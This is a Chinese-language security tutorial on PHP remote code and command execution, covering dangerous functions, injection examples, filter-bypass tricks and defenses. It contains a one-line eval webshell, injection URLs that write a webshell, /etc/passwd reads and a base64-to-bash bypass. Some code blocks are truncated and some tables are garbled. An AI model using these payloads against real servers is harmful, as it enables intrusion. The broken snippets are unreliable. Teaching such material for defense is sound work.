---
title: "RCE 远程命令执行"
published: 2026-09-17T22:47:00+08:00
description: "代码执行与命令执行的常见入口、绕过技巧与防御要点。"
image: ""
tags:
  - 安全笔记
  - Web安全
category: 技术文章
draft: false
lang: zh-CN
pinned: false
comment: true
---

## 一、RCE 概述

### 1.1 什么是 RCE？

**RCE**（Remote Code/Command Execution，**远程代码/命令执行**）属于**注入漏洞**的一种。前端构造的恶意代码片段被后端当作命令或代码执行。

RCE 分为两种类型：

| 类型         | 说明                                                 |
| ------------ | ---------------------------------------------------- |
| **代码执行** | 通过危险函数执行 PHP 代码（如 `eval()`、`assert()`） |
| **命令执行** | 通过危险函数执行系统命令（如 `system()`、`exec()`）  |

### 1.2 RCE 的危害

**技术层面：**

- 造成任意命令/代码执行
- 受害服务器可能被完全控制

**具体影响：**

- 网站被控制
- 信息泄露
- 挖矿
- 首页被篡改
- 服务器负载增加
- 服务器被加入僵尸网络

### 1.3 漏洞原理

```plain
后台存在危险函数（如 eval、system、exec）
    +
后端能接收用户输入
    +
未对输入进行有效过滤和限制
    =
RCE 漏洞
```

### 1.4 如何发现

凡是**通过简单调用操作系统命令**便能完成复杂代码编写才能实现功能的点，都可能触发 RCE。

**典型场景：**

- 测试网络可达性的功能页面（ping）
- 文件打包下载功能（tar）
- 数据库备份功能（mysqldump）
- 系统信息展示功能（uname）

💡 **核心思路**：找到开发人员可能"偷懒"直接调用系统命令的功能点。

------

## 二、代码执行（Code Execution）

### 2.1 危险函数列表

| 函数                     | 说明                                                 |
| ------------------------ | ---------------------------------------------------- |
| `eval()`                 | 将字符串作为 PHP 代码执行（语言结构，无法禁用）      |
| `assert()`               | 将字符串作为 PHP 代码执行（一次只能执行一条）        |
| `preg_replace()`         | 正则替换，`/e` 修饰符导致代码执行（PHP 7.0+ 已移除） |
| `create_function()`      | 创建匿名函数，内部调用 `eval()`                      |
| `array_map()`            | 为数组每个元素应用回调函数                           |
| `call_user_func()`       | 调用回调函数                                         |
| `call_user_func_array()` | 调用回调函数，参数为数组                             |
| `array_filter()`         | 用回调函数过滤数组                                   |
| 文件操作函数             | `file_put_contents()` 可写木马文件                   |
| 动态函数                 | `$a($b)` 形式                                        |

### 2.2 eval()

```php
<?php
// 一句话木马
eval($_REQUEST[6]);

// 获取参数并执行
$code = $_GET['code'];
eval($code);
?>
```

⚠️ `eval()` 是**语言结构**，不是普通函数，**无法通过** `disable_functions` **禁用**。
如需禁用需安装 `suhosin` 扩展。

### 2.3 assert()

```php
<?php
// 与 eval 类似，但一次只能执行一条语句
assert($_REQUEST[6]);
?>
```

**eval vs assert：**

| 对比     | eval()     | assert()                          |
| -------- | ---------- | --------------------------------- |
| 类型     | 语言结构   | 函数                              |
| 可禁用   | ❌ 不可禁用 | ✅ 可通过 `disable_functions` 禁用 |
| 执行多条 | ✅ 可以     | ❌ 只能一条                        |

### 2.4 preg_replace() + /e 修饰符

```php
<?php
// 危险代码（PHP 7.0+ 已移除 /e 修饰符）
@prep_replace("/abc/e", $_REQUEST[6], "abcd");
// 会将 replacement 参数当作 PHP 代码执行
?>
```

| PHP 版本      | /e 支持情况                                   |
| ------------- | --------------------------------------------- |
| PHP 5.5 以下  | ✅ 可直接使用                                  |
| PHP 5.5 ~ 7.0 | ⚠️ 可使用但产生警告                            |
| PHP 7.0 以上  | ❌ 已移除，使用 `preg_replace_callback()` 替代 |

### 2.5 create_function()

```php
<?php
// 创建匿名函数
$myfunc = create_function('$name', 'echo "hello".$name;');
// 等价于
function myfunc($name) {
    echo "hello".$name;
}
?>
```

**注入利用：**

```php
<?php
// 有漏洞的代码
$id = $_GET['id'];
$code = 'return $a."_".$id;';
$func = create_function('$a', $code);
$func(1);

// 攻击 Payload
// ?id=;phpinfo();/*
// 生成的函数变为：
function($a) { return $a."_".;phpinfo();/*"; }
// 执行后调用 phpinfo()
?>
```

### 2.6 array_map()

```php
<?php
// 危险代码
$func = $_GET['func'];
$cmd = $_GET['cmd'];
$array[0] = $cmd;
$new_array = array_map($func, $array);

// Payload
// ?func=system&cmd=whoami
// ?func=assert&cmd=phpinfo()
?>
```

### 2.7 call_user_func()

```php
<?php
// 危险代码
@call_user_func('assert', $_GET['cmd']);

// Payload
// ?cmd=phpinfo()
?>
```

### 2.8 call_user_func_array()

```php
<?php
// 危险代码
$cmd = $_GET['cmd'];
$array[0] = $cmd;
call_user_func_array("assert", $array);

// Payload
// ?cmd=phpinfo()
?>
```

### 2.9 array_filter()

```php
<?php
// 危险代码
$cmd = $_GET['cmd'];
$array1 = array($cmd);
$func = $_GET['func'];
array_filter($array1, $func);

// Payload
// ?func=system&cmd=whoami
?>
```

### 2.10 文件操作函数

```php
<?php
                                                           ?>';
file_put_contents('test1.php', $test);

// 访问 test1.php 即可执行任意代码
?>
```

### 2.11 动态函数

```php
<?php
// PHP 允许通过变量调用函数
// Payload: ?a=assert&b=phpinfo()
$_GET['a']($_GET['b']);
?>
```

### 2.12 双引号解析/复杂表达式

```php
<?php
// PHP 字符串中的复杂表达式可以执行代码
${phpinfo()};     // 执行 phpinfo()
$$(phpinfo());    // 执行 phpinfo()
$a = $(phpinfo()); // 执行 phpinfo()
?>
```

------

## 三、命令执行（Command Execution）

### 3.1 危险函数列表

| 函数           | 说明                                     |
| -------------- | ---------------------------------------- |
| `system()`     | 执行命令，直接输出结果，返回最后一行     |
| `exec()`       | 执行命令，返回最后一行，需手动输出       |
| `shell_exec()` | 执行命令，返回全部结果                   |
| `passthru()`   | 执行命令，直接输出原始结果（支持二进制） |
| `popen()`      | 打开进程指针，需用 `fread()` 读取        |
| `proc_popen()` | 更强大的进程操作                         |
| 反引号         | `` `command` `` 等效于 `shell_exec()`    |

### 3.2 system()

```php
<?php
                                                                                                                          ?>" > 1.php');

// ping 命令
system("ping 127.0.0.1");
?>
```

### 3.3 exec()

```php
<?php
// 只返回最后一行，需手动输出
echo exec('whoami');

// 返回结果到数组
exec("dir", $output);
print_r($output);
?>
```

**system vs exec：**

| 对比       | system()         | exec()          |
| ---------- | ---------------- | --------------- |
| 输出方式   | 直接输出到浏览器 | 需 `echo` 输出  |
| 返回值     | 最后一行         | 最后一行        |
| 第二个参数 | 返回状态码       | 返回数组+状态码 |

### 3.4 shell_exec()

```php
<?php
// 返回全部结果
$res = shell_exec("dir");
var_dump($res);

// 反引号是 shell_exec 的简写
$res = `dir`;
var_dump($res);
?>
```

**常见应用场景：**

```bash
# 文件打包
shell_exec('tar -zcf file.tar.gz /path/to/dir')

# 数据库备份
shell_exec('mysqldump -uroot -p123456 --databases db > backup.sql')

# 系统信息
shell_exec('uname -a')
```

### 3.5 passthru()

```php
<?php
// 直接输出原始结果，支持二进制数据
passthru("ping 127.0.0.1");

// 可以输出图片等二进制数据
passthru("cat image.jpg");
?>
```

### 3.6 popen()

```php
<?php
$res = popen("ping 127.0.0.1", 'r');
echo fread($res, 1024);
pclose($res);
?>
```

### 3.7 命令连接符

#### Windows

| 连接符 | 说明               | 示例                       |
| ------ | ------------------ | -------------------------- |
| `&`    | 两边都执行         | `ping 127.0.0.1 & whoami`  |
| `&&`   | 前面成功才执行后面 | `ping 127.0.0.1 && whoami` |
| `      |                    | `                          |
| `      | `                  | 管道，前面输出作为后面输入 |

#### Linux

| 连接符  | 说明                 | 示例                       |
| ------- | -------------------- | -------------------------- |
| `;`     | 两边都执行           | `ping 127.0.0.1; whoami`   |
| `&`     | 后台执行，两边都执行 | `ping 127.0.0.1 & whoami`  |
| `&&`    | 前面成功才执行后面   | `ping 127.0.0.1 && whoami` |
| `       |                      | `                          |
| `       | `                    | 管道                       |
| `` ` `` | 将命令输出当参数     | `` whoami ``               |
| `$()`   | 将命令输出当参数     | `$(whoami)`                |

### 3.8 实战示例

```bash
# 测试网络可达性功能
http://target.com/ping.php?ip=127.0.0.1

# 命令注入
http://target.com/ping.php?ip=127.0.0.1;whoami
http://target.com/ping.php?ip=127.0.0.1&whoami
http://target.com/ping.php?ip=127.0.0.1|whoami

# 写 webshell
http://target.com/ping.php?ip=127.0.0.1|echo "<?php eval($_REQUEST[6]);?>" > shell.php
```

------

## 四、绕过技巧

### 4.1 黑名单绕过

| 技巧         | 示例                                             |
| ------------ | ------------------------------------------------ |
| **拼接**     | `a=ca;b=t; $a$b /etc/passwd`                     |
| **Base64**   | `echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash` |
| **单双引号** | `ca""t /etc/passwd`                              |
| **反斜线**   | `ca\t /etc/passwd`                               |
| **通配符**   | `/???/c?t /???/p??s??`                           |
| **变量扩展** | `cat ${HOME:0:1}etc${HOME:0:1}passwd`            |
| **特殊变量** | `ca$@t /etc$1/passwd`                            |

### 4.2 空格绕过

| 平台    | 技巧                                 |
| ------- | ------------------------------------ |
| Linux   | `cat</etc/passwd`                    |
| Linux   | `{cat,/etc/passwd}`                  |
| Linux   | `cat$IFS/etc/passwd`                 |
| Linux   | `cat${IFS}/etc/passwd`               |
| Windows | `ping%CommonProgramFiles:~10,-18%IP` |

### 4.3 长度限制绕过

```bash
# 创建空文件
> a

# 按时间排序输出到文件
ls -t > test

# 执行文件中的命令
sh test
```

------

## 五、RCE 防御

### 5.1 代码执行防御

| 措施             | 说明                                                         |
| ---------------- | ------------------------------------------------------------ |
| **禁用危险函数** | 在 `php.ini` 中配置 `disable_functions`                      |
| **禁用危险函数** | `disable_functions = system,exec,shell_exec,passthru,popen,proc_open,pcntl_exec,eval,assert,preg_replace` |
| **输入过滤**     | 对用户输入严格过滤和转义                                     |
| **WAF**          | 部署 Web 应用防火墙                                          |

### 5.2 命令执行防御

| 措施                         | 说明                             |
| ---------------------------- | -------------------------------- |
| **尽量避免使用命令执行函数** | 用原生 PHP 功能替代系统命令      |
| **输入过滤检测**             | 对进入命令函数的参数进行严格过滤 |
| **限制权限**                 | 降低 PHP 进程运行权限            |
| **白名单**                   | 仅允许指定的命令或参数           |

### 5.3 安全配置示例

```properties
# php.ini 配置
disable_functions = system,exec,shell_exec,passthru,popen,proc_popen,pcntl_exec,eval,assert,preg_replace,create_function,array_map,call_user_func,call_user_func_array,array_filter
```

------

## 📌 快速参考卡片

### 代码执行函数

```php
eval($_REQUEST[6]);                    // 语言结构，无法禁用
assert($_REQUEST[6]);                   // 可被 disable_functions 禁用
preg_replace("/abc/e", $_REQUEST[6], "abcd");  // PHP 7.0+ 已移除 /e
create_function('$a', $code);           // 内部调用 eval
array_map($func, $array);               // 回调函数
call_user_func('assert', $_GET['cmd']); // 调用回调函数
file_put_contents('shell.php', '<?php eval($_REQUEST[6]);?>');
$_GET['a']($_GET['b']);                 // 动态函数调用
```

### 命令执行函数

```php
system('whoami');        // 直接输出
exec('whoami');          // 返回最后一行
shell_exec('whoami');    // 返回全部结果
passthru('whoami');      // 原始输出
popen('whoami', 'r');    // 返回指针
`whoami`;                // 反引号执行
```

### 命令连接符

```bash
# Linux
;  # 顺序执行
&  # 后台执行
&& # 前面成功才执行
|| # 前面失败才执行
|  # 管道

# Windows
&  # 两边都执行
&& # 前面成功才执行
|| # 前面失败才执行
|  # 管道
```

### 绕过技巧

```bash
# 空格绕过
cat</etc/passwd
cat$IFS/etc/passwd
{cat,/etc/passwd}

# 黑名单绕过
ca""t /etc/passwd
ca\t /etc/passwd
/???/c?t /???/p??s??
a=ca;b=t; $a$b /etc/passwd

# Base64 绕过
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
```
